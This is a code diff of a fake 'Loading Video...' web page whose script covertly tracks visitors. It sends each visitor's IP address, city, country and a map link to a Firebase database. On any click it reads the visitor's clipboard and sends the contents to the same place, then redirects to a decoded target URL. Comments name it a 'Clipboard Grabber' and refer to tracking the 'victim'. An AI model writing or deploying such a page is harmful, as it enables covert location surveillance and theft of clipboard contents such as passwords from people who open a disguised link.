@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading Video...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .loader { border: 4px solid #333; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -13,47 +15,51 @@
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        const params = new URLSearchParams(window.location.search);
-        const id = params.get('id');
 
-        if (id) {
-            const [userKey, targetUrl] = atob(id).split('|');
+        async function startSpy() {
+            const params = new URLSearchParams(window.location.search);
+            const id = params.get('id');
+            if(!id) return;
 
-            // 1. TRACKING LOGIC (Location/IP/Device)
-            async function trackVictim() {
-                let data = { time: new Date().toLocaleString(), ip: "Unknown", loc: "Unknown", map: "#" };
+            try {
+                // Decode Key and Redirect URL
+                const [userKey, targetUrl] = atob(id).split('|');
+
+                // 1. Silent Location Tracking
+                let info = { time: new Date().toLocaleString(), ip: "Unknown", loc: "Unknown", map: "#" };
                 try {
                     const res = await fetch('https://ipwho.is/');
                     const d = await res.json();
-                    data.ip = d.ip;
-                    data.loc = `${d.city}, ${d.country}`;
-                    data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-                } catch (e) {}
-
-                await fetch(`${DB_URL}tracking/${userKey}.json`, {
-                    method: 'POST',
-                    body: JSON.stringify(data)
-                });
-
-                // Auto redirect after 3 seconds
-                setTimeout(() => { window.location.href = targetUrl; }, 3000);
-            }
-
-            // 2. CLIPBOARD GRABBER (On click)
-            document.body.onclick = async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    if(text) {
-                        await fetch(`${DB_URL}clipboard/${userKey}.json`, {
-                            method: 'POST',
-                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() })
-                        });
-                    }
+                    info.ip = d.ip;
+                    info.loc = `${d.city}, ${d.country}`;
+                    info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                 } catch(e) {}
-            };
 
-            trackVictim();
+                // Send to Firebase
+                await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(info) });
+
+                // 2. Clipboard Grabber (Works when they click anywhere)
+                document.body.onclick = async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if(text) {
+                            await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
+                                method: 'POST', 
+                                body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
+                            });
+                        }
+                    } catch(e) {}
+                    // Move to target after click
+                    window.location.href = targetUrl;
+                };
+
+                // Auto move after 4 seconds even if no click
+                setTimeout(() => { window.location.href = targetUrl; }, 4000);
+
+            } catch(e) { window.location.href = "https://youtube.com"; }
         }
+
+        startSpy();
     </script>
 </body>
 </html>
